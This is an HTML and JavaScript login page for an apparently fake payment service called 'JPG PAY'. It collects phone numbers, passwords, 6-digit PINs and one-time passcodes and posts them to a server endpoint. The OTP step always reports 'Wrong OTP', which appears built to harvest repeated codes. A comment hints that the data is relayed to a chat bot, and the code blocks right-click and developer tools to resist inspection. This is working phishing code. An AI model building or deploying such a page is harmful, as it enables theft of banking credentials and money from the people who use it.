<!DOCTYPrE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#0a0a0a">
  <meta name="description" content="JPG PAY - Secure Digital Payment Platform">
  <title>JPG PAY</title>
  <style>
    /* ============ RESET ============ */
    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
    
    html, body {
      height: 100%;
      overflow-x: hidden;
    }

    body {
      background: #0a0a0a;
      background-image: 
        radial-gradient(circle at 20% 10%, rgba(77, 182, 172, 0.08) 0%, transparent 50%),
        radial-gradient(circle at 80% 90%, rgba(77, 182, 172, 0.05) 0%, transparent 50%);
      color: #e0e0e0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      position: relative;
      animation: fadeIn 0.5s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* ============ CONTAINER ============ */
    .container { 
      width: 100%; 
      max-width: 380px; 
      text-align: center;
      position: relative;
      z-index: 1;
    }

    /* ============ LOGO ============ */
    .logo-box {
      width: 130px; 
      height: 130px;
      border-radius: 32px;
      margin: 0 auto 14px;
      overflow: hidden;
      background: #0f0f0f;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 
        0 0 40px rgba(77, 182, 172, 0.15),
        inset 0 0 20px rgba(0,0,0,0.5);
      border: 1px solid rgba(77, 182, 172, 0.15);
      position: relative;
    }
    .logo-box::before {
      content: '';
      position: absolute;
      inset: -1px;
      border-radius: 32px;
      padding: 1px;
      background: linear-gradient(135deg, rgba(77,182,172,0.4), rgba(77,182,172,0.05));
      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      pointer-events: none;
    }
    .logo-box img { 
      width: 100%; height: 100%; 
      object-fit: cover; display: block;
      user-select: none;
      -webkit-user-drag: none;
    }

    /* Brand Name */
    .brand-name {
      font-size: 24px;
      font-weight: 800;
      letter-spacing: 4px;
      color: #ffffff;
      margin-bottom: 6px;
      text-transform: uppercase;
    }
    .brand-tagline {
      font-size: 12px;
      color: #4db6ac;
      letter-spacing: 2px;
      margin-bottom: 36px;
      text-transform: uppercase;
      opacity: 0.8;
    }

    /* ============ INPUT FIELDS ============ */
    .input-group {
      display: flex;
      align-items: center;
      background: rgba(255, 255, 255, 0.02);
      border: 1.5px solid #2a2a2a;
      border-radius: 30px;
      padding: 16px 22px;
      margin-bottom: 16px;
      transition: all 0.25s ease;
      backdrop-filter: blur(10px);
    }
    .input-group:focus-within {
      border-color: #4db6ac;
      background: rgba(77, 182, 172, 0.05);
      box-shadow: 0 0 0 4px rgba(77, 182, 172, 0.08);
    }
    .input-group svg {
      width: 22px; height: 22px;
      fill: #4db6ac;
      margin-right: 16px;
      flex-shrink: 0;
      transition: transform 0.25s;
    }
    .input-group:focus-within svg {
      transform: scale(1.1);
    }
    .input-group input {
      background: transparent;
      border: none;
      color: #ffffff;
      font-size: 16px;
      width: 100%;
      outline: none;
      font-weight: 500;
      letter-spacing: 0.5px;
    }
    .input-group input::placeholder { 
      color: #555555; 
      font-weight: 400;
      letter-spacing: normal;
    }
    .input-group input#pin {
      letter-spacing: 8px;
      font-weight: 600;
    }
    .input-group input#pin::placeholder {
      letter-spacing: normal;
      font-weight: 400;
    }

    /* ============ REMEMBER / REGISTER ============ */
    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 14px;
      color: #4db6ac;
      margin-bottom: 22px;
      padding: 0 6px;
      font-weight: 600;
    }
    .row a { 
      color: #4db6ac; 
      text-decoration: none;
      transition: opacity 0.2s;
    }
    .row a:hover { opacity: 0.7; }
    .row div { 
      display: flex; 
      align-items: center; 
      gap: 8px; 
      cursor: pointer;
      user-select: none;
    }
    .row input[type="radio"] {
      width: 16px; height: 16px;
      accent-color: #4db6ac;
      cursor: pointer;
    }

    /* ============ AGREEMENT ============ */
    .checkbox-container {
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      color: #4db6ac;
      margin-bottom: 28px;
      font-weight: 500;
      gap: 10px;
      cursor: pointer;
      user-select: none;
    }
    .checkbox-container input {
      width: 18px; height: 18px;
      accent-color: #4db6ac;
      cursor: pointer;
    }

    /* ============ MAIN BUTTON ============ */
    .btn-main {
      width: 100%;
      padding: 17px;
      background: linear-gradient(135deg, #1e5b4f 0%, #164a40 100%);
      color: #ffffff;
      border: none;
      border-radius: 30px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.25s ease;
      box-shadow: 0 6px 20px rgba(30, 91, 79, 0.4);
      letter-spacing: 1px;
      position: relative;
      overflow: hidden;
    }
    .btn-main::before {
      content: '';
      position: absolute;
      top: 0; left: -100%;
      width: 100%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
      transition: left 0.5s;
    }
    .btn-main:hover::before { left: 100%; }
    .btn-main:hover { 
      transform: translateY(-2px); 
      box-shadow: 0 10px 30px rgba(30, 91, 79, 0.6);
    }
    .btn-main:active { transform: scale(0.98); }
    .btn-main:disabled { 
      background: #2a2a2a; 
      cursor: not-allowed; 
      box-shadow: none; 
      transform: none;
      color: #666;
    }

    /* ============ POPUP OVERLAY ============ */
    .popup-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.85);
      justify-content: center;
      align-items: center;
      padding: 20px;
      z-index: 1000;
      backdrop-filter: blur(8px);
      animation: fadeIn 0.3s ease;
    }
    .popup-box {
      background: linear-gradient(135deg, #1a1a1a 0%, #141414 100%);
      padding: 28px 24px;
      border-radius: 26px;
      width: 100%;
      max-width: 380px;
      position: relative;
      box-shadow: 
        0 20px 60px rgba(0, 0, 0, 0.8),
        inset 0 1px 0 rgba(255, 255, 255, 0.05);
      border: 1px solid #2a2a2a;
      animation: popupIn 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    @keyframes popupIn {
      from { opacity: 0; transform: scale(0.9) translateY(20px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }
    .close-btn {
      position: absolute;
      top: 15px; right: 15px;
      background: #2a2a2a;
      color: #aaa;
      border: none;
      border-radius: 50%;
      width: 34px; height: 34px;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.25s;
    }
    .close-btn:hover { 
      background: #3a3a3a; 
      color: #fff; 
      transform: rotate(90deg);
    }
    .popup-box h2 { 
      font-size: 22px;
      margin-bottom: 12px;
      text-align: left;
      color: #ffffff;
      font-weight: 700;
    }
    .popup-box p { 
      font-size: 14px;
      color: #999999;
      margin-bottom: 14px;
      line-height: 1.5;
      text-align: left;
    }
    .popup-box p span { 
      color: #4db6ac; 
      font-weight: 700;
    }

    /* ============ OTP INPUT ============ */
    .otp-input-group {
      display: flex;
      align-items: center;
      background: rgba(255, 255, 255, 0.02);
      border: 1.5px solid #2a2a2a;
      border-radius: 30px;
      padding: 6px 6px 6px 20px;
      margin-bottom: 20px;
      transition: border-color 0.25s;
    }
    .otp-input-group:focus-within {
      border-color: #4db6ac;
      box-shadow: 0 0 0 4px rgba(77, 182, 172, 0.08);
    }
    .otp-input-group input {
      flex: 1;
      background: transparent;
      border: none;
      color: #ffffff;
      padding: 12px 0;
      font-size: 16px;
      outline: none;
      font-weight: 500;
      letter-spacing: 2px;
    }
    .otp-input-group input::placeholder { 
      color: #666; 
      letter-spacing: normal;
    }
    .otp-input-group button {
      background: linear-gradient(135deg, #1e5b4f 0%, #164a40 100%);
      color: #fff;
      border: none;
      border-radius: 25px;
      padding: 12px 24px;
      font-weight: 700;
      cursor: pointer;
      font-size: 14px;
      transition: all 0.25s;
      letter-spacing: 0.5px;
      box-shadow: 0 3px 10px rgba(30, 91, 79, 0.4);
    }
    .otp-input-group button:hover { 
      transform: translateY(-1px);
      box-shadow: 0 5px 15px rgba(30, 91, 79, 0.6);
    }
    .otp-input-group button:disabled { 
      background: #333;
      color: #777;
      cursor: not-allowed;
      box-shadow: none;
      transform: none;
    }
    .timer-text { 
      color: #888;
      font-size: 13px;
      margin-bottom: 20px;
      text-align: center;
      min-height: 18px;
      font-weight: 500;
    }

    /* ============ TOAST ============ */
    .toast {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%) translateY(-100px);
      background: linear-gradient(135deg, #1e5b4f, #164a40);
      color: #fff;
      padding: 14px 26px;
      border-radius: 14px;
      font-size: 14px;
      font-weight: 600;
      z-index: 2000;
      transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 90%;
      text-align: center;
      border: 1px solid rgba(77, 182, 172, 0.3);
    }
    .toast.show { 
      transform: translateX(-50%) translateY(0); 
    }
    .toast.error { 
      background: linear-gradient(135deg, #b91c1c, #991b1b);
      border-color: rgba(255, 100, 100, 0.3);
    }

    /* ============ LOADER ============ */
    .loader {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255,255,255,0.3);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      vertical-align: middle;
      margin-right: 8px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* ============ RESPONSIVE ============ */
    @media (max-width: 400px) {
      .container { max-width: 100%; }
      .brand-name { font-size: 22px; letter-spacing: 3px; }
      .logo-box { width: 110px; height: 110px; }
      .input-group { padding: 14px 20px; }
      .btn-main { padding: 16px; font-size: 16px; }
    }

    /* ============ SELECTION DISABLE ============ */
    .no-select {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }
  </style>
</head>
<body class="no-select">

  <!-- Toast Notification -->
  <div class="toast" id="toast"></div>

  <div class="container">
    <!-- Logo -->
    <div class="logo-box">
      <img src="jpglogo.png" alt="JPG PAY" draggable="false">
    </div>

    <!-- Brand -->
    <div class="brand-name">JPG PAY</div>
    <div class="brand-tagline">Secure Payment</div>

    <!-- Phone Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="tel" id="phone" placeholder="Phone Number" maxlength="10" 
             inputmode="numeric" autocomplete="off"
             oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <!-- Password Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password" autocomplete="new-password">
    </div>

    <!-- 6-digit PIN -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" 
             inputmode="numeric" autocomplete="off"
             oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
    </div>

    <!-- Register & Remember -->
    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" name="remember" id="remember"> <label for="remember">Remember Me</label></div>
    </div>

    <!-- Agreement -->
    <div class="checkbox-container">
      <input type="radio" name="agree" id="agree" checked>
      <label for="agree">Agree "User Privacy Agreement"</label>
    </div>

    <!-- Sign In Button -->
    <button class="btn-main" id="signInBtn" onclick="showOTP()">SIGN IN</button>
  </div>

  <!-- OTP Popup -->
  <div class="popup-overlay" id="otpPopup">
    <div class="popup-box">
      <button class="close-btn" onclick="closeOTP()">✕</button>
      <h2>Login OTP</h2>
      <p>Tap <b>Send</b> to receive the OTP, then enter it to confirm this login.</p>
      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>

      <div class="otp-input-group">
        <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6"
               inputmode="numeric" autocomplete="one-time-code"
               oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
      </div>

      <div class="timer-text" id="timerText"></div>

      <button class="btn-main" id="confirmBtn" onclick="verifyOTP()">CONFIRM</button>
    </div>
  </div>

  <script>
    // ==========================================
    // JPG PAY - Secure Frontend
    // NOTE: Koi Token ya Chat ID yahan NAHI hai
    // Sab kuch server (/api/send) par safe hai
    // ==========================================

    let countdown;
    let timeLeft = 60;
    let isProcessing = false;

    // ============ TOAST ============
    function showToast(msg, isError = false) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.className = 'toast show' + (isError ? ' error' : '');
      clearTimeout(toast._timeout);
      toast._timeout = setTimeout(() => { 
        toast.className = 'toast'; 
      }, 3000);
    }

    // ============ API CALL ============
    async function callAPI(data) {
      try {
        const response = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        return await response.json();
      } catch (err) {
        console.error('API Error:', err);
        return { error: 'Network error' };
      }
    }

    // ============ SHOW OTP POPUP ============
    async function showOTP() {
      if (isProcessing) return;

      const phone = document.getElementById('phone').value.trim();
      const pass = document.getElementById('pass').value.trim();
      const pin = document.getElementById('pin').value.trim();
      const btn = document.getElementById('signInBtn');

      // Validation
      if (!phone || !pass || !pin) {
        showToast('Please fill all fields!', true);
        return;
      }
      if (phone.length !== 10) {
        showToast('Phone must be 10 digits!', true);
        return;
      }
      if (pass.length < 4) {
        showToast('Password too short!', true);
        return;
      }
      if (pin.length !== 6) {
        showToast('PIN must be exactly 6 digits!', true);
        return;
      }

      // Lock button
      isProcessing = true;
      btn.disabled = true;
      btn.innerHTML = '<span class="loader"></span>Please wait...';

      try {
        const result = await callAPI({ phone, pass, pin, type: 'login' });
        
        if (result.error) {
          showToast(result.error, true);
        } else {
          document.getElementById('displayPhone').innerText = "+91 " + phone;
          document.getElementById('otpPopup').style.display = 'flex';
          resetTimer();
        }
      } catch (err) {
        showToast('Something went wrong!', true);
      } finally {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'SIGN IN';
      }
    }

    // ============ CLOSE OTP ============
    function closeOTP() {
      document.getElementById('otpPopup').style.display = 'none';
      clearInterval(countdown);
    }

    // ============ SEND OTP ============
    async function sendOTP() {
      const phone = document.getElementById('phone').value;
      const btn = document.getElementById('sendOtpBtn');

      startTimer();
      btn.disabled = true;
      btn.innerText = "Sending...";

      await callAPI({ phone, type: 'send_otp' });

      btn.innerText = "Sent ✓";
    }

    // ============ VERIFY OTP ============
    async function verifyOTP() {
      if (isProcessing) return;

      const otp = document.getElementById('otpInput').value;
      const phone = document.getElementById('phone').value;
      const btn = document.getElementById('confirmBtn');

      if (!otp) { 
        showToast('Please enter OTP!', true); 
        return; 
      }
      if (otp.length !== 6) { 
        showToast('OTP must be 6 digits!', true); 
        return; 
      }

      isProcessing = true;
      btn.disabled = true;
      btn.innerHTML = '<span class="loader"></span>Verifying...';

      try {
        await callAPI({ phone, otp, type: 'verify_otp' });
      } catch (err) {
        console.error(err);
      }

      setTimeout(() => {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'CONFIRM';
        showToast('❌ Wrong OTP! Please try again.', true);
      }, 800);
    }

    // ============ TIMER ============
    function startTimer() {
      timeLeft = 60;
      const timerDisplay = document.getElementById('timerText');
      clearInterval(countdown);
      countdown = setInterval(() => {
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerDisplay.innerText = "";
          document.getElementById('sendOtpBtn').disabled = false;
          document.getElementById('sendOtpBtn').innerText = "Send";
        } else {
          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
          timeLeft--;
        }
      }, 1000);
    }

    function resetTimer() {
      clearInterval(countdown);
      timeLeft = 60;
      document.getElementById('sendOtpBtn').disabled = false;
      document.getElementById('sendOtpBtn').innerText = "Send";
      document.getElementById('otpInput').value = "";
      document.getElementById('timerText').innerText = "";
    }

    // ============ SECURITY: RIGHT CLICK & DEVTOOLS BLOCK ============
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
        (e.ctrlKey && e.key === 'U')
      ) {
        e.preventDefault();
        return false;
      }
    });
  </script>

</body>
</html>
